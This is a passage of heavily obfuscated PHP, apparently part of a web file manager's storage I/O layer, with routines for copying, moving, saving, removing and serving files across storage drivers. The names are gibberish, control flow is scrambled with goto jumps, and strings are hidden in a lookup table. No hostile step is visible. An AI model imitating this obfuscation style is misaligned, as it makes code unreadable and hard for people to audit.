$cùôö„ÑÓ¯[$f¾¿É¦µ…º[6]] = json_decode($cùôö„ÑÓ¯[$f¾¿É¦µ…º[6]], !0); } return $cùôö„ÑÓ¯; } public function driverInfo($Aš–Ç„„È) { $C¬™Õ×ø‚î =& $_SERVER[Ö]; $B‘¶ÙÆã“œ = array_to_keyvalue(parent::listData(), $C¬™Õ×ø‚î[363]); if (!isset($B‘¶ÙÆã“œ[$Aš–Ç„„È])) { return !1; } $EÃ´“â´ô = $B‘¶ÙÆã“œ[$Aš–Ç„„È]; $EÃ´“â´ô[$C¬™Õ×ø‚î[6]] = json_decode($EÃ´“â´ô[$C¬™Õ×ø‚î[6]], !0); return $EÃ´“â´ô; } public function remove($f­÷Æåõ¶˜) { $this->removeShareItems($f­÷Æåõ¶˜); return parent::remove($f­÷Æåõ¶˜); } public function removeWithFile($b¸ã°‰‚«‚) { goto fÁ¡•·–ô; c§ç‹ôÔÏ¥: $AìÆÎÌÀñ = Model($C…Ÿ†ášºÇ[163])->where($f‚¥ÆÙ¡«)->field($C…Ÿ†ášºÇ[2348])->select(); foreach ($AìÆÎÌÀñ as $FÙÒî¶ÇªÚ) { goto Då¾–Ä¼ˆø; AĞÜ„²ç¡ª: if (IO::exist($aÁ½•Ÿ¯ñ¬)) { $a¶Ó²¶×ÚÄ->updateFileEnd($FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[28]], $FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[77]]); continue; } if (!IO::move($aÔŞËÉ’Ê, get_path_father($aÁ½•Ÿ¯ñ¬))) { $B‘·ÄâËË• = !1; break; } $f‚¥ÆÙ¡« = array($C…Ÿ†ášºÇ[415] => $FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[415]]); goto Cè…×Æš“•; Då¾–Ä¼ˆø: $aÔŞËÉ’Ê = $FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[75]]; $aÁ½•Ÿ¯ñ¬ = $b İ¦îÊ . str_replace("\173\151\157\72{$b¸ã°‰‚«‚}\x7d\x2f", $C…Ÿ†ášºÇ[33], $aÔŞËÉ’Ê); if (!IO::exist($aÔŞËÉ’Ê)) { $eáßƒ¯Ç”[] = $FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[415]]; $a¶Ó²¶×ÚÄ->updateFileEnd($FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[28]], $FÙÒî¶ÇªÚ[$C…Ÿ†ášºÇ[77]]); continue; } goto AĞÜ„²ç¡ª; Cè…×Æš“•: $DƒÒØ‹Ñ¾‰ = array($C…Ÿ†ášºÇ[736] => $e–ù†°ªÚø, $C…Ÿ†ášºÇ[75] => $aÁ½•Ÿ¯ñ¬); Model($C…Ÿ†ášºÇ[163])->where($f‚¥ÆÙ¡«)->save($DƒÒØ‹Ñ¾‰); goto b¥î¿ÅéÃÛ; b¥î¿ÅéÃÛ: } $this->removeByFileID($eáßƒ¯Ç”); goto Dí”²ğŞ®; Dí”²ğŞ®: if (!$B‘·ÄâËË•) { $a¶Ó²¶×ÚÄ->stop($F½–Ÿ“ç©Â); return !1; } $a¶Ó²¶×ÚÄ->end(); $this->remove($b¸ã°‰‚«‚); goto f™ÂÖ©‘‰; bÛäÇÄùœÍ: $a¶Ó²¶×ÚÄ->task[$C…Ÿ†ášºÇ[691]] = (double) $aæ©Æù¼‘Ç; $Fæ£º”±†Ï = KodIO::defaultDriver(); $e–ù†°ªÚø = $Fæ£º”±†Ï[$C…Ÿ†ášºÇ[363]]; goto d²œÊŒ¾èŸ; B´¢’ğ„ïò: $aæ©Æù¼‘Ç = Model($C…Ÿ†ášºÇ[418])->where($f‚¥ÆÙ¡«)->sum($C…Ÿ†ášºÇ[77]); $F½–Ÿ“ç©Â = $C…Ÿ†ášºÇ[2345] . $b¸ã°‰‚«‚; $a¶Ó²¶×ÚÄ = new TaskFileTransfer($F½–Ÿ“ç©Â, $C…Ÿ†ášºÇ[2346], $e±¶·°§ƒë, LNG($C…Ÿ†ášºÇ[2347]) . "\50{$b¸ã°‰‚«‚}\51"); goto bÛäÇÄùœÍ; fÁ¡•·–ô: $C…Ÿ†ášºÇ =& $_SERVER[Ö]; $f‚¥ÆÙ¡« = array($C…Ÿ†ášºÇ[736] => $b¸ã°‰‚«‚); $e±¶·°§ƒë = Model($C…Ÿ†ášºÇ[418])->where($f‚¥ÆÙ¡«)->count(); goto B´¢’ğ„ïò; d²œÊŒ¾èŸ: $b İ¦îÊ = "\173\x69\157\x3a{$e–ù†°ªÚø}\175\x2f"; $B‘·ÄâËË• = !0; $eáßƒ¯Ç” = array(); goto c§ç‹ôÔÏ¥; f™ÂÖ©‘‰: } public function progress($a²Ú«õàºç) { return Task::get($_SERVER[Ö][2345] . $a²Ú«õàºç); } private function removeByFileID($eÇÈ’Âñö = array()) { goto fÚ™¿³¯ğ‹; fÚ™¿³¯ğ‹: $Eºç˜²‡Ú  =& $_SERVER[Ö]; if (empty($eÇÈ’Âñö)) { return; } $BÀö—ï‘–ä = array($Eºç˜²‡Ú [415] => array($Eºç˜²‡Ú [7], $eÇÈ’Âñö)); goto A«¬ºïÏ; cĞ‡¤µï•×: foreach ($EÏÙÍƒ‹ÉÉ as $FÈÎô¢šè) { Model($Eºç˜²‡Ú [378])->removeNow($FÈÎô¢šè, !1); } goto bÑƒï—‚¯; A«¬ºïÏ: $EÏÙÍƒ‹ÉÉ = Model($Eºç˜²‡Ú [1103])->where($BÀö—ï‘–ä)->field($Eºç˜²‡Ú [365])->select(); if (!$EÏÙÍƒ‹ÉÉ) { return; } $EÏÙÍƒ‹ÉÉ = array_to_keyvalue($EÏÙÍƒ‹ÉÉ, $Eºç˜²‡Ú [33], $Eºç˜²‡Ú [365]); goto cĞ‡¤µï•×; bÑƒï—‚¯: } private function removeShareItems($e›ååéÈÆ²) { goto AªƒÁÈ×‡µ; AªƒÁÈ×‡µ: $Eİ…†£¥„Ï =& $_SERVER[Ö]; $Fè«÷¦¢¶ = "\x7b\151\x6f\x3a{$e›ååéÈÆ²}\175\57"; $eôš¿¿ë…â = array($Eİ…†£¥„Ï[365] => 0, $Eİ…†£¥„Ï[1011] => array($Eİ…†£¥„Ï[744], "{$Fè«÷¦¢¶}\x25")); goto BªÔÓÂÙ; BªÔÓÂÙ: $cåØßÌ÷—Ÿ = Model($Eİ…†£¥„Ï[2054])->where($eôš¿¿ë…â)->field($Eİ…†£¥„Ï[437])->select(); if (empty($cåØßÌ÷—Ÿ)) { return; } $Eã¯Ì÷©é± = array_to_keyvalue($cåØßÌ÷—Ÿ, $Eİ…†£¥„Ï[33], $Eİ…†£¥„Ï[437]); goto C‹˜ŠÏ¹ Ø; C‹˜ŠÏ¹ Ø: Model($Eİ…†£¥„Ï[532])->remove($Eã¯Ì÷©é±); goto EåˆáõÆÚ; EåˆáõÆÚ: } } goto Eì‘‰ôÒÔ…; EÛ¬ÊŞ£ë“: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($CòŞé÷Şå, $D×ßË¸¡‘²) { $a¤ĞÙ­çî¡ = self::driverMake($D×ßË¸¡‘²[0]); if (method_exists($a¤ĞÙ­çî¡, $CòŞé÷Şå)) { return @call_user_func_array(array($a¤ĞÙ­çî¡, $CòŞé÷Şå), $D×ßË¸¡‘²); } if (method_exists($a¤ĞÙ­çî¡, $_SERVER[Ö][990])) { return @call_user_func_array(array($a¤ĞÙ­çî¡, $CòŞé÷Şå), $D×ßË¸¡‘²); } else { if (method_exists(self, $CòŞé÷Şå)) { return @call_user_func_array(array(self, $CòŞé÷Şå), $D×ßË¸¡‘²); } else { call_user_func_array(array(parent, $CòŞé÷Şå), $D×ßË¸¡‘²); } } } public static function init($b±Ÿ·ïÕîÎ) { return self::driverMake($b±Ÿ·ïÕîÎ); } public static function copy($DÚ¶òäÔ™, $Dİ‚¦‹À¶‡, $FÁçÑÔŞÑ = false, $bÎ¢Èœ„ŒŒ = false) { return self::copyMove($DÚ¶òäÔ™, $Dİ‚¦‹À¶‡, $FÁçÑÔŞÑ, $_SERVER[Ö][486], $bÎ¢Èœ„ŒŒ); } public static function move($f¥ôâ¦Š±, $cÒÌÕËê™œ, $D‘–æÎßææ = false, $cÑ¯Ã¹ìÖ = false) { return self::copyMove($f¥ôâ¦Š±, $cÒÌÕËê™œ, $D‘–æÎßææ, $_SERVER[Ö][488], $cÑ¯Ã¹ìÖ); } public static function saveFile($E‡öºé±ó, $d½›í³ê‘æ, $c¦­÷®¡ƒ¢ = true) { goto EÁÒêŒ™³; EÁÒêŒ™³: $FÌ–´¥›‹Ó =& $_SERVER[Ö]; $B¢ÀÃÇÊ†Í = self::info($d½›í³ê‘æ); $dºéµˆŒº© = self::driverMake($E‡öºé±ó); goto Bƒì…ù–ËÕ; F†ª«º: $B•¾Ìé¶öª = self::copyFile($dºéµˆŒº©, $E‡öºé±ó, $E°Öô£¯ß…, $E†¶Òš¾¾„, $B¢ÀÃÇÊ†Í[$FÌ–´¥›‹Ó[28]], $c‘è†ç ´˜); if ($bñóã¯Ç½ï) { $B•¾Ìé¶öª = $bñóã¯Ç½ï->getPathOuter($B•¾Ìé¶öª); } return $B•¾Ìé¶öª; goto CÅë´ì“äœ; Bƒì…ù–ËÕ: $E°Öô£¯ß… = self::driverMake($d½›í³ê‘æ); $bñóã¯Ç½ï = !1; if ($E°Öô£¯ß…->pathParse[$FÌ–´¥›‹Ó[991]]) { $e‚îŞ¯Ø×­ = $E°Öô£¯ß…->pathParse[$FÌ–´¥›‹Ó[991]]; $bñóã¯Ç½ï = $E°Öô£¯ß…; $E°Öô£¯ß… = self::driverMake($e‚îŞ¯Ø×­); } goto E—çºàØ—±; E—çºàØ—±: $E†¶Òš¾¾„ = $E°Öô£¯ß…->pathFather($d½›í³ê‘æ); $c‘è†ç ´˜ = !0; if (!$c¦­÷®¡ƒ¢ && self::driverIsSame($dºéµˆŒº©, $E°Öô£¯ß…)) { $c‘è†ç ´˜ = !1; } goto F†ª«º; CÅë´ì“äœ: } private static function copyMove($F‘ˆÂÃÜ×, $B­»ÏÊÚìì, $aĞ›™ß“ÃÈ, $c®Æ­öñ•œ, $e°ÂƒçŒÌ„ = false) { goto C—õêĞ­›³; DÜóà¯ªï: if ($BÛ–ï†ê·“) { $C¡¡¾¬³ºÍ = $BÛ–ï†ê·“->getPathOuter($C¡¡¾¬³ºÍ); } return $C¡¡¾¬³ºÍ; goto Bß«ÌÚê; e’ÖËƒğÌâ: $BÛ–ï†ê·“ = !1; if ($f÷½ª¨°¢->pathParse[$EôŞ¦ÙÕõ¨[991]]) { $B­»ÏÊÚìì = $f÷½ª¨°¢->pathParse[$EôŞ¦ÙÕõ¨[991]]; $BÛ–ï†ê·“ = $f÷½ª¨°¢; $f÷½ª¨°¢ = self::driverMake($B­»ÏÊÚìì); } self::check($aÄğ—¬ô¦Ù, $F‘ˆÂÃÜ×, $f÷½ª¨°¢, $B­»ÏÊÚìì); goto C‰Ó¿Â Á; e¯•¶”ĞÕõ: $Aƒç²ï’äÜ = $aÄğ—¬ô¦Ù->isFile($F‘ˆÂÃÜ×); if (!$Aƒç²ï’äÜ && $f÷½ª¨°¢->getType() == $EôŞ¦ÙÕõ¨[687] && $aÄğ—¬ô¦Ù->getType() == $EôŞ¦ÙÕõ¨[101]) { $C¡¡¾¬³ºÍ = $f÷½ª¨°¢->copyFolderFromIO($aÄğ—¬ô¦Ù, $F‘ˆÂÃÜ×, $B­»ÏÊÚìì, $aĞ›™ß“ÃÈ, $A“”ÍÄ¼ì, $e°ÂƒçŒÌ„); } else { $C¡¡¾¬³ºÍ = self::copyPath($aÄğ—¬ô¦Ù, $F‘ˆÂÃÜ×, $f÷½ª¨°¢, $B­»ÏÊÚìì, $aĞ›™ß“ÃÈ, $A“”ÍÄ¼ì, $Aƒç²ï’äÜ, $e°ÂƒçŒÌ„); } if ($C¡¡¾¬³ºÍ && $A“”ÍÄ¼ì) { $aÄğ—¬ô¦Ù->remove($F‘ˆÂÃÜ×); } goto DÜóà¯ªï; C‰Ó¿Â Á: Hook::trigger($EôŞ¦ÙÕõ¨[72], $aÄğ—¬ô¦Ù, $F‘ˆÂÃÜ×, $f÷½ª¨°¢, $B­»ÏÊÚìì); $fŞÙ«¯‹ = self::driverIsSame($aÄğ—¬ô¦Ù, $f÷½ª¨°¢); if ($fŞÙ«¯‹) { if ($c®Æ­öñ•œ == $EôŞ¦ÙÕõ¨[488] && trim($B­»ÏÊÚìì, $EôŞ¦ÙÕõ¨[8]) == trim($f÷½ª¨°¢->pathFather($F‘ˆÂÃÜ×), $EôŞ¦ÙÕõ¨[8])) { return $f÷½ª¨°¢->getPathOuter($F‘ˆÂÃÜ×); } if (method_exists($f÷½ª¨°¢, $c®Æ­öñ•œ)) { return $f÷½ª¨°¢->{$c®Æ­öñ•œ}($F‘ˆÂÃÜ×, $B­»ÏÊÚìì, $aĞ›™ß“ÃÈ); } } goto e¯•¶”ĞÕõ; C—õêĞ­›³: $EôŞ¦ÙÕõ¨ =& $_SERVER[Ö]; if (!$F‘ˆÂÃÜ× || $F‘ˆÂÃÜ× == $EôŞ¦ÙÕõ¨[8] || !$B­»ÏÊÚìì) { return !1; } ignore_timeout(); goto dá¬¬ñ´œµ; dá¬¬ñ´œµ: $aÄğ—¬ô¦Ù = self::driverMake($F‘ˆÂÃÜ×); $f÷½ª¨°¢ = self::driverMake($B­»ÏÊÚìì); $A“”ÍÄ¼ì = $c®Æ­öñ•œ == $EôŞ¦ÙÕõ¨[488]; goto e’ÖËƒğÌâ; Bß«ÌÚê: } private static function check($bÇË ç¥Ìî, $E‰Ë‰ËğæÚ, $F·…– ÊÛ‹, &$d‘‹ÁëáÇÕ) { $e«ƒ®ª£´ =& $_SERVER[Ö]; if (self::driverIsSame($bÇË ç¥Ìî, $F·…– ÊÛ‹) && $bÇË ç¥Ìî->isFolder($E‰Ë‰ËğæÚ) && $bÇË ç¥Ìî->isParentOf($E‰Ë‰ËğæÚ, $d‘‹ÁëáÇÕ)) { show_json(LNG($e«ƒ®ª£´[992]), !1); } if (!$bÇË ç¥Ìî->exist($E‰Ë‰ËğæÚ)) { show_json(LNG($e«ƒ®ª£´[100]), !1); } } private static function copyPath($C­¨ê½¯‰è, $Fí›†­šºÀ, $BÛç„”îÁ, $c¼–ÉèÓ×Ä, $Bàè‚˜í, $E¦Â÷Â½¡æ, $aÌ‡ğÏ˜ëŠ, $fÉ‘ïñÅ = false) { goto fÂ•¹ò£šÇ; fÂ•¹ò£šÇ: $F¤ºõºÂŠà =& $_SERVER[Ö]; $cØ›—Ç˜Ì– = $fÉ‘ïñÅ ? $fÉ‘ïñÅ : $C­¨ê½¯‰è->getPathName($C­¨ê½¯‰è->pathThis($Fí›†­šºÀ)); if ($Bàè‚˜í) { $Dâµ£­Æİ = $BÛç„”îÁ->fileNameExist($c¼–ÉèÓ×Ä, $cØ›—Ç˜Ì–); $cØ›—Ç˜Ì– = $BÛç„”îÁ->fileNameAuto($c¼–ÉèÓ×Ä, $cØ›—Ç˜Ì–, $Bàè‚˜í, !$aÌ‡ğÏ˜ëŠ); $Bàè‚˜í = $Dâµ£­Æİ ? $Bàè‚˜í : !1; } goto e†¥ëŠ„¿; e†¥ëŠ„¿: if ($aÌ‡ğÏ˜ëŠ) { return self::copyFile($C­¨ê½¯‰è, $Fí›†­šºÀ, $BÛç„”îÁ, $c¼–ÉèÓ×Ä, $cØ›—Ç˜Ì–, $E¦Â÷Â½¡æ); } if ($Bàè‚˜í == REPEAT_RENAME_FOLDER) { $Bàè‚˜í = !1; } $EÁ¶Í´ºÑå = rtrim($c¼–ÉèÓ×Ä, $F¤ºõºÂŠà[8]) . $F¤ºõºÂŠà[8] . $cØ›—Ç˜Ì–; goto a¨éœƒ‘éá; B‹¤•¢ø¾: $dÖÖÙÔ¦İì = array_merge($aÚ¦Ûë¥İÙ[$F¤ºõºÂŠà[73]], $aÚ¦Ûë¥İÙ[$F¤ºõºÂŠà[74]]); foreach ($dÖÖÙÔ¦İì as $A˜Û‡Œ«–†) { $aÛ³µå÷ = $A˜Û‡Œ«–†[$F¤ºõºÂŠà[29]] == $F¤ºõºÂŠà[163]; $Fí›†­šºÀ = $C­¨ê½¯‰è->getPathInner($A˜Û‡Œ«–†[$F¤ºõºÂŠà[75]]); $cè”åçÎª = self::copyPath($C­¨ê½¯‰è, $Fí›†­šºÀ, $BÛç„”îÁ, $c¼–ÉèÓ×Ä, $Bàè‚˜í, $E¦Â÷Â½¡æ, $aÛ³µå÷); if (!$cè”åçÎª) { write_log($F¤ºõºÂŠà[993] . $Fí›†­šºÀ . $F¤ºõºÂŠà[994] . $c¼–ÉèÓ×Ä, $F¤ºõºÂŠà[995]); } } return $aêá“ğ—¹ˆ; goto B«Îàå£ƒˆ; a¨éœƒ‘éá: $aêá“ğ—¹ˆ = $BÛç„”îÁ->mkdir($BÛç„”îÁ->getPath($EÁ¶Í´ºÑå)); $c¼–ÉèÓ×Ä = $BÛç„”îÁ->getPathInner($aêá“ğ—¹ˆ); $aÚ¦Ûë¥İÙ = $C­¨ê½¯‰è->listPath($Fí›†­šºÀ, !0); goto B‹¤•¢ø¾; B«Îàå£ƒˆ: } private static function copyFile($cîÖŸé×ŸŠ, $e¥…µëŸÙé, $EïšãëÆà², $AÙ¥ÍŒôÀ, $Fˆ×Ü´•æ¾, $Cù¤½ÔÆ’¹) { goto d¤Ù¾Ùæ; bèÙ‘ŒêÄ¿: mk_dir($fÂ²Ÿ¼ñ…±); $böÊµš§ˆˆ = $fÂ²Ÿ¼ñ…± . $CæŠ°åïÆØ; $böÊµš§ˆˆ = $cîÖŸé×ŸŠ->download($e¥…µëŸÙé, $böÊµš§ˆˆ); goto BÇ¨´öª˜Ô; f¢ÖËæøÏ˜: Hook::trigger($A‰‰Äíí†Œ[997], $cîÖŸé×ŸŠ, $e¥…µëŸÙé, $EïšãëÆà², $AÙ¥ÍŒôÀ, $Fˆ×Ü´•æ¾, $CæŠ°åïÆØ); if (self::driverIsSame($cîÖŸé×ŸŠ, $EïšãëÆà²)) { if ($Cù¤½ÔÆ’¹) { $bĞ­óî¥ˆ = $EïšãëÆà²->moveFile($e¥…µëŸÙé, $AÙ¥ÍŒôÀ); } else { $bĞ­óî¥ˆ = $EïšãëÆà²->copyFile($e¥…µëŸÙé, $AÙ¥ÍŒôÀ); } Hook::trigger($A‰‰Äíí†Œ[998], $cîÖŸé×ŸŠ, $e¥…µëŸÙé, $EïšãëÆà², $AÙ¥ÍŒôÀ, $Fˆ×Ü´•æ¾, $bĞ­óî¥ˆ); return $bĞ­óî¥ˆ; } $fÂ²Ÿ¼ñ…± = TEMP_FILES; goto bèÙ‘ŒêÄ¿; d¤Ù¾Ùæ: $A‰‰Äíí†Œ =& $_SERVER[Ö]; $AÙ¥ÍŒôÀ = $EïšãëÆà²->getPath(rtrim($AÙ¥ÍŒôÀ, $A‰‰Äíí†Œ[8]) . $A‰‰Äíí†Œ[8] . $Fˆ×Ü´•æ¾); $CæŠ°åïÆØ = $A‰‰Äíí†Œ[996] . time() . rand_string(5); goto f¢ÖËæøÏ˜; BÇ¨´öª˜Ô: $böÊµš§ˆˆ = $cîÖŸé×ŸŠ->iconvApp($böÊµš§ˆˆ); $bĞ­óî¥ˆ = $EïšãëÆà²->upload($AÙ¥ÍŒôÀ, $böÊµš§ˆˆ, $Cù¤½ÔÆ’¹); self::remove($fÂ²Ÿ¼ñ…± . $CæŠ°åïÆØ); goto b¾’‰¨ÎÉ; b¾’‰¨ÎÉ: Hook::trigger($A‰‰Äíí†Œ[998], $cîÖŸé×ŸŠ, $e¥…µëŸÙé, $EïšãëÆà², $AÙ¥ÍŒôÀ, $Fˆ×Ü´•æ¾, $bĞ­óî¥ˆ); return $bĞ­óî¥ˆ; goto F¿¹“¾Ğê; F¿¹“¾Ğê: } public static function pathFather($EĞÚÆá…») { $aáßÏ‘âÕ² = IO::init($EĞÚÆá…»); $b¾š•ŠàÙØ = $aáßÏ‘âÕ²->pathFather($aáßÏ‘âÕ²->path); return $aáßÏ‘âÕ²->getPathOuter($b¾š•ŠàÙØ); } public static function fileOut($dì‹Èæ¢öÖ, $B‡‹¶¸’Ÿ¢ = false, $C…šîÛÚ®Ô = false, $cÇáñ£õ° = '') { $fá©ïØ‘Ñ = self::driverMake($dì‹Èæ¢öÖ); if ($fá©ïØ‘Ñ->isFileOutServer()) { return $fá©ïØ‘Ñ->fileOutServer($dì‹Èæ¢öÖ, $B‡‹¶¸’Ÿ¢, $C…šîÛÚ®Ô, $cÇáñ£õ°); } return $fá©ïØ‘Ñ->fileOut($dì‹Èæ¢öÖ, $B‡‹¶¸’Ÿ¢, $C…šîÛÚ®Ô, $cÇáñ£õ°); } public static function fileOutImage($DšµÛ¤Ù™×, $a—ÀË—• = 250) { $DµÇÈŞ‚‡æ = array(250, 600, 1200, 3000); for ($cª¨¿çß  = 0; $cª¨¿çß  < count($DµÇÈŞ‚‡æ); $cª¨¿çß ++) { if ($cª¨¿çß  == 0 && $a—ÀË—• <= $DµÇÈŞ‚‡æ[$cª¨¿çß ]) { $a—ÀË—• = $DµÇÈŞ‚‡æ[$cª¨¿çß ]; break; } else { if ($a—ÀË—• > $DµÇÈŞ‚‡æ[$cª¨¿çß  - 1] && $a—ÀË—• <= $DµÇÈŞ‚‡æ[$cª¨¿çß ]) { $a—ÀË—• = $DµÇÈŞ‚‡æ[$cª¨¿çß ]; break; } else { if ($cª¨¿çß  == count($DµÇÈŞ‚‡æ) - 1 && $a—ÀË—• > $DµÇÈŞ‚‡æ[$cª¨¿çß ]) { $a—ÀË—• = $DµÇÈŞ‚‡æ[$cª¨¿çß ]; break; } } } } $C÷¡¯Òå¢î = self::driverMake($DšµÛ¤Ù™×); if ($C÷¡¯Òå¢î->isFileOutServer()) { return $C÷¡¯Òå¢î->fileOutImageServer($DšµÛ¤Ù™×, $a—ÀË—•); } return $C÷¡¯Òå¢î->fileOutImage($DšµÛ¤Ù™×, $a—ÀË—•); } private static function driverIsSame($aì¾×µœÇ, $F¤ÇĞ’àŸÇ) { goto A¼ò•È¶’; aæŠĞ‘œÕ‚: if ($B™ß×µ· != $CÎ„¸ÁÃà˜) { return !1; } if ($B™ß×µ· == $D—¬¢ƒÇ¡õ[687]) { return !0; } if ($B™ß×µ· == $D—¬¢ƒÇ¡õ[101]) { return !0; } goto cÍêÎ‹ßõ–; cÍêÎ‹ßõ–: if ($aì¾×µœÇ->pathDriver == $F¤ÇĞ’àŸÇ->pathDriver) { return !0; } return !1; goto Aö‚¦É¯£õ; A¼ò•È¶’: $D—¬¢ƒÇ¡õ =& $_SERVER[Ö]; $B™ß×µ· = $aì¾×µœÇ->getType(); $CÎ„¸ÁÃà˜ = $F¤ÇĞ’àŸÇ->getType(); goto aæŠĞ‘œÕ‚; Aö‚¦É¯£õ: } public static function copyUpdate($e«‡©µìóÅ, $e•Ó˜»‰Š) { goto F§÷àÓêì§; Fß·äªñÄ™: $d·Ï²¡‡œ = array(); foreach ($eŠÙĞÑÔæ as $BˆôĞŸ‹ß => $b… ”»”‚Ó) { if (isset($cÒ›‰‹éÅÓ[$BˆôĞŸ‹ß])) { if ($b… ”»”‚Ó[$Bé ²ø²ù†[76]] == 1) { continue; } if ($cÒ›‰‹éÅÓ[$BˆôĞŸ‹ß][$Bé ²ø²ù†[77]] == $b… ”»”‚Ó[$Bé ²ø²ù†[77]]) { continue; } } if ($b… ”»”‚Ó[$Bé ²ø²ù†[76]] == 1) { $d·Ï²¡‡œ[] = $e•Ó˜»‰Š . $Bé ²ø²ù†[8] . $BˆôĞŸ‹ß; continue; } $Bƒİ‹Êß›÷ = strstr(trim($BˆôĞŸ‹ß, $Bé ²ø²ù†[8]), $Bé ²ø²ù†[8]) ? get_path_father($BˆôĞŸ‹ß) : $Bé ²ø²ù†[33]; $E¿ëĞ†ÕÏ¼[] = array($Bé ²ø²ù†[999] => $b… ”»”‚Ó[$Bé ²ø²ù†[75]], $Bé ²ø²ù†[1000] => rtrim($e•Ó˜»‰Š, $Bé ²ø²ù†[8]) . $Bé ²ø²ù†[8] . $Bƒİ‹Êß›÷, $Bé ²ø²ù†[1001] => $b… ”»”‚Ó); } $a´©¤½ÓÇ = array($Bé ²ø²ù†[163] => $E¿ëĞ†ÕÏ¼, $Bé ²ø²ù†[76] => $d·Ï²¡‡œ); goto cá¡Œ‘ñœ¾; F§÷àÓêì§: $Bé ²ø²ù† =& $_SERVER[Ö]; if (!IO::exist($e«‡©µìóÅ)) { return !1; } if (!IO::exist($e•Ó˜»‰Š)) { IO::mkdir($e•Ó˜»‰Š); } goto b‹”´¶‘“¯; b‹”´¶‘“¯: $eŠÙĞÑÔæ = self::_listAll($e«‡©µìóÅ); $cÒ›‰‹éÅÓ = self::_listAll($e•Ó˜»‰Š); $E¿ëĞ†ÕÏ¼ = array(); goto Fß·äªñÄ™; cá¡Œ‘ñœ¾: Hook::trigger($Bé ²ø²ù†[1002], $e«‡©µìóÅ, $e•Ó˜»‰Š, $a´©¤½ÓÇ); foreach ($d·Ï²¡‡œ as $b… ”»”‚Ó) { IO::mkdir($b… ”»”‚Ó); } foreach ($E¿ëĞ†ÕÏ¼ as $b… ”»”‚Ó) { IO::copy($b… ”»”‚Ó[$Bé ²ø²ù†[999]], $b… ”»”‚Ó[$Bé ²ø²ù†[1000]], REPEAT_REPLACE); } goto aïåéÉå•ã; aïåéÉå•ã: } private static function _listAll($c»Š£¹¯‡) { $EÉ¹ÖÎÏ =& $_SERVER[Ö]; $c»Š£¹¯‡ = KodIO::clear($c»Š£¹¯‡); $eÍ±ÜœÙ°… = IO::listAll($c»Š£¹¯‡); foreach ($eÍ±ÜœÙ°… as &$AŒ¯í©İ‹) { $a¹½é¡ºĞì = substr($AŒ¯í©İ‹[$EÉ¹ÖÎÏ[75]], strlen($c»Š£¹¯‡)); $AŒ¯í©İ‹[$EÉ¹ÖÎÏ[1003]] = trim($a¹½é¡ºĞì, $EÉ¹ÖÎÏ[8]); } return array_to_keyvalue($eÍ±ÜœÙ°…, $EÉ¹ÖÎÏ[1003]); } public static function fileSubstr($B‡¡Èäé¸, $C¶÷·Üª¾Ì, $aø¦äÀ™²ß = false) { goto c™çÓï†µ; c™çÓï†µ: $DÛƒÌÖèÊÇ = self::driverMake($B‡¡Èäé¸); $EÑÆÉÑøäë = $DÛƒÌÖèÊÇ->size($B‡¡Èäé¸); $C¶å•Ï½ïæ = $C¶÷·Üª¾Ì; goto Ağ…¡èçÌ; B·ïã¡­î§: if ($C¶÷·Üª¾Ì + $aø¦äÀ™²ß > $EÑÆÉÑøäë) { $aø¦äÀ™²ß = $EÑÆÉÑøäë - $C¶÷·Üª¾Ì; } if ($aø¦äÀ™²ß <= 0) { return $_SERVER[Ö][33]; } if ($C¶÷·Üª¾Ì < 0 || $C¶÷·Üª¾Ì >= $EÑÆÉÑøäë || $aø¦äÀ™²ß > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\x52\x65\141\144\x20\x65\x72\162\x6f\162\41\40\163\x74\141\x72\x74\x3d{$C¶÷·Üª¾Ì}\x3b\154\145\x6e\x67\164\x68\x3d{$aø¦äÀ™²ß}\73\40\x73\x69\x7a\145\75{$EÑÆÉÑøäë}\x3b"); } goto A˜Â†øªà; Ağ…¡èçÌ: $e±¾¦Ê¿‰ = $aø¦äÀ™²ß; if ($C¶÷·Üª¾Ì < 0) { $C¶÷·Üª¾Ì = $EÑÆÉÑøäë + $C¶÷·Üª¾Ì; } if ($aø¦äÀ™²ß === !1) { $aø¦äÀ™²ß = $EÑÆÉÑøäë - $C¶÷·Üª¾Ì; } goto B·ïã¡­î§; A˜Â†øªà: return $DÛƒÌÖèÊÇ->fileSubstr($B‡¡Èäé¸, $C¶÷·Üª¾Ì, $aø¦äÀ™²ß); goto cºñ¹‚’¨†; cºñ¹‚’¨†: } private static function driverMake(&$FÉãì‚„ğ©) { goto AêåÁ©Ñ‹¿; D™‘É¾åøÆ: if ($e–¶ğŒÏ…Ì[$cÁ¼ä×¨Ã[29]] == KodIO::KOD_IO && !self::$driverListSystem[$e–¶ğŒÏ…Ì[$cÁ¼ä×¨Ã[363]]]) { return !1; } $FÉãì‚„ğ© = $e–¶ğŒÏ…Ì[$cÁ¼ä×¨Ã[1004]]; $c‹Ÿ‘çğ¾Ä = self::driverGet($e–¶ğŒÏ…Ì, $FÉãì‚„ğ©); goto bŞ¨Ó“ ‹š; bŞ¨Ó“ ‹š: return $c‹Ÿ‘çğ¾Ä; goto dó•¦–à’; AêåÁ©Ñ‹¿: $cÁ¼ä×¨Ã =& $_SERVER[Ö]; $e–¶ğŒÏ…Ì = KodIO::parse($FÉãì‚„ğ©); if (!self::$driverListSystem) { $CšÏåá§Ìƒ = Model($cÁ¼ä×¨Ã[697])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($CšÏåá§Ìƒ, $cÁ¼ä×¨Ã[363]); } goto D™‘É¾åøÆ; dó•¦–à’: } private static function driverGet($BÓÊœ ç©õ, &$E²Ö¡Ÿİğ) { goto bôª’ë÷²Ü; aà·ª¿øÆ„: if (isset($A—ËŒÉîêò[$fÌ¨ä®¼„ˆ[6]][$fÌ¨ä®¼„ˆ[1017]])) { $a¿è¿·İè¯->pathBase = rtrim($A—ËŒÉîêò[$fÌ¨ä®¼„ˆ[6]][$fÌ¨ä®¼„ˆ[1017]], $fÌ¨ä®¼„ˆ[8]) . $fÌ¨ä®¼„ˆ[8]; $E²Ö¡Ÿİğ = $a¿è¿·İè¯->pathBase . ltrim($E²Ö¡Ÿİğ, $fÌ¨ä®¼„ˆ[8]); } $E²Ö¡Ÿİğ = 